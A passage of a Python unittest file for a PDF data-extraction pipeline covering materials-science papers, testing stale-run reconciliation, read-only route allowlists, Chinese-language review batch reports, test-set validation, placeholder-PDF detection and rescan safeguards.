            ai_id = conn.execute(
                """INSERT INTO ai_extraction_runs
                   (paper_id,provider,model,mode,status,pdf_sha256,created_at)
                   VALUES(?,?,?,?,?,?,?)""",
                (self.paper_id, "deepseek", "test", "preview", "running", "sha", "2020-01-01T00:00:00Z"),
            ).lastrowid
            quality_id = conn.execute(
                """INSERT INTO quality_pipeline_runs
                   (paper_id,status,stage,progress,created_at)
                   VALUES(?,?,?,?,?)""",
                (self.paper_id, "running", "extracting", 40, "2020-01-01T00:00:00Z"),
            ).lastrowid
            job_id = conn.execute(
                """INSERT INTO processing_jobs
                   (paper_id,job_type,status,provider,created_at,updated_at)
                   VALUES(?,?,?,?,?,?)""",
                (self.paper_id, "extract", "running", "deepseek", "2020-01-01T00:00:00Z", "2020-01-01T00:00:00Z"),
            ).lastrowid
            completed_id = conn.execute(
                """INSERT INTO ai_extraction_runs
                   (paper_id,provider,model,mode,status,pdf_sha256,error_message,created_at,finished_at)
                   VALUES(?,?,?,?,?,?,?,?,?)""",
                (self.paper_id, "deepseek", "test", "preview", "completed", "sha", "old warning", "2020-01-01T00:00:00Z", "2020-01-01T00:01:00Z"),
            ).lastrowid
        report = reconcile_stale_runs(self.db, older_than_hours=1)
        self.assertEqual(report["ai_run_ids"], [ai_id])
        self.assertEqual(report["quality_run_ids"], [quality_id])
        self.assertEqual(report["processing_job_ids"], [job_id])
        self.assertEqual(report["completed_errors_cleared"]["ai"], 1)
        self.assertEqual(len(list_current_data(self.db, self.paper_id)), before_rows)
        with self.db.connect() as conn:
            self.assertEqual(conn.execute(
                "SELECT status FROM ai_extraction_runs WHERE id=?", (ai_id,)
            ).fetchone()["status"], "failed")
            quality = conn.execute(
                "SELECT status,progress FROM quality_pipeline_runs WHERE id=?", (quality_id,)
            ).fetchone()
            self.assertEqual((quality["status"], quality["progress"]), ("failed", 100))
            self.assertIsNone(conn.execute(
                "SELECT error_message FROM ai_extraction_runs WHERE id=?", (completed_id,)
            ).fetchone()["error_message"])

    def test_read_only_mode_classifies_post_requests_as_mutating(self):
        self.assertFalse(is_read_only_mutation("GET", "/api/six-search"))
        self.assertFalse(is_read_only_mutation("HEAD", "/"))
        self.assertFalse(is_read_only_mutation("POST", "/api/context-chat"))
        self.assertFalse(is_read_only_mutation("POST", "/api/agents/librarian/chat"))
        self.assertFalse(is_read_only_mutation("POST", "/api/agents/librarian/research-brief.md"))
        self.assertFalse(is_read_only_public_get("/api/agents/librarian/research-brief.md"))
        self.assertTrue(is_read_only_mutation("POST", "/api/current-paper/deepseek-preview"))
        self.assertTrue(is_read_only_mutation("POST", "/api/uploads/pdf"))

    def test_read_only_public_get_allowlist_is_search_only(self):
        self.assertTrue(is_read_only_public_get("/"))
        self.assertTrue(is_read_only_public_get("/api/six-search"))
        self.assertTrue(is_read_only_public_get("/api/search-papers"))
        self.assertTrue(is_read_only_public_get("/api/qualitative-search"))
        self.assertTrue(is_read_only_public_get("/api/qualitative-export.csv"))
        self.assertTrue(is_read_only_public_get("/api/qualitative-export.xlsx"))
        self.assertTrue(is_read_only_public_get("/api/six-export.xlsx"))
        self.assertTrue(is_read_only_public_get("/api/six-data/335/source-view"))
        self.assertTrue(is_read_only_public_get("/api/six-data/335/source-highlight.png"))
        self.assertTrue(is_read_only_public_get("/api/six-data/335/source-snippet.png"))
        self.assertTrue(is_read_only_public_get("/api/papers/2/pdf"))
        self.assertTrue(is_read_only_public_get("/api/visual-search"))
        self.assertTrue(is_read_only_public_get("/api/search-v2"))
        self.assertTrue(is_read_only_public_get("/api/search-v2/status"))
        self.assertTrue(is_read_only_public_get("/api/agents"))
        self.assertTrue(is_read_only_public_get("/api/visual-assets/3"))
        self.assertTrue(is_read_only_public_get("/api/visual-assets/3/image"))
        self.assertFalse(is_read_only_public_get("/api/current-paper"))
        self.assertFalse(is_read_only_public_get("/api/papers"))
        self.assertFalse(is_read_only_public_get("/api/uploads"))
        self.assertFalse(is_read_only_public_get("/api/current-paper/learning-samples"))

    def test_review_handoff_markdown_summarizes_automatic_quality_next_step(self):
        out = Path(self.tmp.name) / "handoff.md"
        result = generate_review_handoff(
            self.db,
            "Irradiation effects in high entropy alloys and 316H stainless steel at 300 C",
            out=out,
        )
        self.assertTrue(result["ok"], result)
        self.assertTrue(out.is_file())
        text = out.read_text(encoding="utf-8")
        self.assertIn("目标文章自动质量与证据检查摘要", text)
        self.assertIn("对抗式质量提取", text)
        self.assertIn("自动拦截", text)
        self.assertIn("原文证据", text)
        self.assertIn("不需要逐条人工批准", text)

    def test_review_batch_markdown_lists_next_unreviewed_rows(self):
        out = Path(self.tmp.name) / "batch.md"
        result = generate_review_batch(
            self.db,
            "Irradiation effects in high entropy alloys and 316H stainless steel at 300 C",
            limit=5,
            out=out,
        )
        self.assertTrue(result["ok"], result)
        self.assertEqual(result["batch_count"], 5)
        self.assertTrue(out.is_file())
        text = out.read_text(encoding="utf-8")
        self.assertIn("下一批待审核数据清单", text)
        self.assertIn("核验优先级", text)
        self.assertIn("item_id=", text)
        self.assertIn("/api/six-data/", text)
        self.assertIn("核验记录", text)

    def test_review_batch_payload_can_be_downloaded_without_writing_a_file(self):
        payload = review_batch_payload(self.db, self.paper_id, limit=3)
        self.assertTrue(payload["ok"])
        self.assertEqual(payload["batch_count"], 3)
        self.assertIn("下一批待审核数据清单", payload["markdown"])
        self.assertIn("item_id=", payload["markdown"])
        self.assertNotIn("path", payload)

    def test_calibration_review_batch_covers_diverse_evidence_forms(self):
        payload = review_batch_payload(self.db, self.paper_id, limit=20, strategy="calibration")
        self.assertTrue(payload["ok"])
        self.assertEqual(payload["strategy"], "calibration")
        self.assertEqual(payload["batch_count"], 20)
        self.assertEqual(len(payload["selected_item_ids"]), len(set(payload["selected_item_ids"])))
        summary = payload["calibration_summary"]
        self.assertGreaterEqual(len(summary["locator_kind"]), 3)
        self.assertGreaterEqual(len(summary["value_shape"]), 4)
        self.assertGreaterEqual(len(summary["candidate_role"]), 4)
        self.assertGreaterEqual(len(summary["semantic_family"]), 4)
        self.assertGreaterEqual(len(summary["page"]), 5)
        selected = {
            row["item_id"]: row for row in list_current_data(self.db, self.paper_id)
            if row["item_id"] in payload["selected_item_ids"]
        }
        self.assertGreaterEqual(len({row["meaning"] for row in selected.values()}), 17)
        self.assertIn("分层校准核验清单", payload["markdown"])
        self.assertIn("本批覆盖", payload["markdown"])
        self.assertIn("校准覆盖", payload["markdown"])

    def test_review_batch_rejects_unknown_strategy(self):
        with self.assertRaisesRegex(ValueError, "unsupported review batch strategy"):
            review_batch_payload(self.db, self.paper_id, limit=3, strategy="random")

    def test_goal_audit_treats_automatic_quality_as_completion_gate(self):
        out = Path(self.tmp.name) / "goal_audit.md"
        bundle_dir = Path(self.tmp.name) / "bundles"
        bundle_dir.mkdir()
        (bundle_dir / "auto-research-test.bundle").write_text("fake bundle marker", encoding="utf-8")
        result = generate_goal_audit(
            self.db,
            "Irradiation effects in high entropy alloys and 316H stainless steel at 300 C",
            out=out,
            bundle_dir=bundle_dir,
            corpus_audit_path=None,
        )
        self.assertTrue(result["automatic_ready"], result)
        self.assertFalse(result["goal_complete"], result)
        self.assertGreater(result["review_progress"]["unreviewed"], 0)
        self.assertTrue(out.is_file())
        text = out.read_text(encoding="utf-8")
        self.assertIn("自动化实验数据提取目标审计", text)
        self.assertIn("最终目标完成：否", text)
        self.assertIn("不能宣称批量目标完成", text)

    def test_self_check_fails_when_article_has_no_extracted_rows(self):
        other = self.db.upsert_paper(
            title="Empty but real PDF article", doi="10.1/empty-self-check",
            pdf_path=self.db.get_paper(self.paper_id)["pdf_path"],
        )
        report = check_evidence_workflow(self.db, "10.1/empty-self-check", queries=["温度"])
        self.assertFalse(report["ok"])
        by_name = {check["name"]: check for check in report["checks"]}
        self.assertFalse(by_name["six_column_rows"]["ok"])
        self.assertFalse(by_name["source_highlight"]["ok"])
        requirements = {item["id"]: item for item in report["requirements"]}
        self.assertFalse(requirements["article_selector_to_extracted_rows"]["ok"])

    def test_run_article_workflow_prepares_packet_for_unknown_pdf_article(self):
        other = self.db.upsert_paper(
            title="Another paper", doi="10.1/other", local_article_key="ALT0001",
            pdf_path=self.db.get_paper(self.paper_id)["pdf_path"],
        )
        old_prompt_dir = prompt_module.PROMPT_DIR
        prompt_module.PROMPT_DIR = Path(self.tmp.name) / "workflow_packets"
        try:
            with patch(
                "auto_research.evidence.six_column.DeepSeekSettings.from_env",
                return_value=DeepSeekSettings(api_key=None),
            ):
                result = run_article_workflow(self.db, article_key="ALT0001", max_pages=2)
                self.assertEqual(result["action"], "prepare_packet")
                self.assertEqual(result["paper"]["id"], other)
                self.assertEqual(result["status_after"]["row_count"], 0)
                self.assertIsNone(result["evidence_audit"])
                self.assertTrue(Path(result["action_result"]["packet_path"]).is_file())
        finally:
            prompt_module.PROMPT_DIR = old_prompt_dir

    def test_extraction_status_marks_scanned_papers_for_rescan_confirmation(self):
        status = get_six_extraction_status(self.db, self.paper_id)
        self.assertTrue(status["scanned"])
        self.assertEqual(status["scan_state"], "scanned")
        self.assertEqual(status["row_count"], len(list_reportable_current_data(self.db, self.paper_id)))
        self.assertTrue(requires_rescan_confirmation(self.db, self.paper_id))

        empty = self.db.upsert_paper(
            title="Empty paper", doi="10.1/empty", local_article_key="EMPTY",
            pdf_path=self.db.get_paper(self.paper_id)["pdf_path"],
        )
        empty_status = get_six_extraction_status(self.db, empty)
        self.assertFalse(empty_status["scanned"])
        self.assertFalse(requires_rescan_confirmation(self.db, empty))

        with self.db.connect() as conn:
            conn.execute(
                """INSERT INTO ai_extraction_runs
                   (paper_id,provider,model,mode,status,pdf_sha256,chunk_count,created_at,finished_at)
                   VALUES(?,?,?,?,?,?,?,?,?)""",
                (empty, "deepseek", "fake", "preview", "completed", "sha", 1, "2026-07-09T00:00:00Z", "2026-07-09T00:01:00Z"),
            )
        completed_status = get_six_extraction_status(self.db, empty)
        self.assertTrue(completed_status["scanned"])
        self.assertEqual(completed_status["completed_ai_run_count"], 1)
        self.assertTrue(requires_rescan_confirmation(self.db, empty))

    def test_default_full_corpus_test_set_has_50_unique_selectors_and_queries(self):
        payload = load_test_set(DEFAULT_CONFIG)
        self.assertEqual(payload["version"], "full-corpus-50-v1")
        self.assertEqual(payload["expected_paper_count"], 50)
        self.assertEqual(len(payload["papers"]), 50)
        selectors = {
            ("doi", item["doi"].lower()) if item.get("doi") else ("title", item["title"].casefold())
            for item in payload["papers"]
        }
        self.assertEqual(len(selectors), 50)
        self.assertTrue(all(item["queries"] for item in payload["papers"]))

    def test_fixed_test_set_rejects_duplicate_selectors(self):
        path = Path(self.tmp.name) / "invalid-test-set.json"
        papers = [
            {"doi": "10.1/duplicate", "queries": ["硬度"]}
            for _ in range(5)
        ]
        path.write_text(json.dumps({"version": "invalid", "expected_paper_count": 5, "papers": papers}), encoding="utf-8")
        with self.assertRaisesRegex(ValueError, "5 unique paper selectors"):
            load_test_set(path)

    def test_test_set_pdf_gate_uses_document_fingerprint_and_rejects_download_pages(self):
        valid_path = Path(self.tmp.name) / "valid.pdf"
        doc = fitz.open()
        page = doc.new_page()
        page.insert_textbox(
            fitz.Rect(30, 30, 560, 780),
            ("Experimental methods irradiation temperature hardness results. " * 40),
            fontsize=9,
        )
        doc.save(valid_path)
        doc.close()
        actual_hash = hashlib.sha256(valid_path.read_bytes()).hexdigest()
        valid_id = self.db.upsert_paper(
            title="Valid registered paper", doi="10.1/valid-pdf", pdf_path=str(valid_path),
            pdf_sha256="stale-paper-fingerprint", authenticity_status="verified_pdf",
        )
        with self.db.connect() as conn:
            conn.execute(
                """INSERT INTO documents(
                     paper_id,source_type,original_filename,stored_path,pdf_sha256,text_sha256,
                     text_sketch_json,page_count,text_char_count,needs_ocr,version_label,created_at
                   ) VALUES(?,?,?,?,?,?,?,?,?,?,?,?)""",
                (valid_id, "existing", valid_path.name, str(valid_path), actual_hash, None,
                 "[]", 1, 2400, 0, "primary", "2026-07-14T00:00:00Z"),
            )
        valid_status = _pdf_status(self.db, self.db.get_paper(valid_id))
        self.assertTrue(valid_status["content_valid"])
        self.assertTrue(valid_status["fingerprint_matches"])
        self.assertEqual(valid_status["fingerprint_source"], "document")

        placeholder_path = Path(self.tmp.name) / "placeholder.pdf"
        doc = fitz.open()
        page = doc.new_page()
        page.insert_text((40, 80), "Preparing to download ... HHS Vulnerability Disclosure")
        doc.save(placeholder_path)
        doc.close()
        placeholder_hash = hashlib.sha256(placeholder_path.read_bytes()).hexdigest()
        placeholder_id = self.db.upsert_paper(
            title="Download placeholder", doi="10.1/placeholder", pdf_path=str(placeholder_path),
            pdf_sha256=placeholder_hash, authenticity_status="verified_pdf",
        )
        placeholder_status = _pdf_status(self.db, self.db.get_paper(placeholder_id))
        self.assertTrue(placeholder_status["openable"])
        self.assertTrue(placeholder_status["placeholder_detected"])
        self.assertFalse(placeholder_status["content_valid"])

    def test_scanned_paper_can_be_saved_as_timestamped_snapshot(self):
        old_dir = six_column_module.SAVED_SCANS_DIR
        six_column_module.SAVED_SCANS_DIR = Path(self.tmp.name) / "saved_scans"
        try:
            result = save_current_paper_snapshot(self.db, self.paper_id)
            self.assertTrue(result["ok"])
            reportable_count = len(list_reportable_current_data(self.db, self.paper_id))
            self.assertEqual(result["row_count"], reportable_count)
            path = Path(result["path"])
            self.assertTrue(path.is_file())
            with path.open(encoding="utf-8-sig", newline="") as handle:
                rows = list(csv.DictReader(handle))
            self.assertEqual(len(rows), reportable_count)
            self.assertIn("value_text", rows[0])
            status = get_six_extraction_status(self.db, self.paper_id)
            self.assertEqual(status["saved_snapshot_path"], str(path))

            empty = self.db.upsert_paper(
                title="Empty paper", doi="10.1/snapshot-empty", local_article_key="SNAPEMPTY",
                pdf_path=self.db.get_paper(self.paper_id)["pdf_path"],
            )
            with self.assertRaisesRegex(ValueError, "还没有可保存"):
                save_current_paper_snapshot(self.db, empty)
        finally:
            six_column_module.SAVED_SCANS_DIR = old_dir

    def test_run_article_workflow_uses_deepseek_for_new_pdf_article(self):
        other = self.db.upsert_paper(
            title="Another paper", doi="10.1/deepseek", local_article_key="ALT0002",
            pdf_path=self.db.get_paper(self.paper_id)["pdf_path"],
        )
        fake_result = {
            "pipeline_run_id": 99,
            "summary": {"dual_pass_count": 2, "third_pass_count": 0, "manual_review_count": 1},
        }
        with patch(
            "auto_research.evidence.six_column.DeepSeekSettings.from_env",
            return_value=DeepSeekSettings(api_key="fake"),
        ), patch("auto_research.evidence.workflow.AdversarialQualityPipeline") as extractor:
            extractor.return_value.run.return_value = fake_result
            result = run_article_workflow(self.db, article_key="ALT0002", max_pages=2)
        self.assertEqual(result["action"], "quality_extract")
        self.assertEqual(result["paper"]["id"], other)
        extractor.return_value.run.assert_called_once_with(
            other, max_pages=2, chunk_pages=2
        )

    def test_run_article_workflow_requires_force_for_scanned_deepseek_paper(self):
        other = self.db.upsert_paper(
            title="Scanned DeepSeek paper", doi="10.1/deepseek-scanned", local_article_key="ALT0003",
            pdf_path=self.db.get_paper(self.paper_id)["pdf_path"],
        )
        add_manual_item(self.db, other, {
            "value_text": "1", "meaning": "已保存测试数据", "unit": "dpa",
            "article_title": "Scanned DeepSeek paper", "doi": "10.1/deepseek-scanned",
            "context_explanation": "已有六列数据；用于验证重复扫描保护",
        })
        fake_result = {
            "pipeline_run_id": 100,
            "summary": {"dual_pass_count": 1, "third_pass_count": 0, "manual_review_count": 0},
        }
        with patch(
            "auto_research.evidence.six_column.DeepSeekSettings.from_env",
            return_value=DeepSeekSettings(api_key="fake"),
        ), patch("auto_research.evidence.workflow.AdversarialQualityPipeline") as extractor:
            with self.assertRaisesRegex(ValueError, "已经扫描过"):
                run_article_workflow(self.db, article_key="ALT0003", max_pages=2)
            extractor.return_value.run.assert_not_called()

            extractor.return_value.run.return_value = fake_result
            result = run_article_workflow(
                self.db, article_key="ALT0003", max_pages=2, force_rescan=True
            )
        self.assertEqual(result["action"], "quality_rescan")
        extractor.return_value.run.assert_called_once_with(
            other, max_pages=2, chunk_pages=2
        )


if __name__ == "__main__":
    unittest.main()
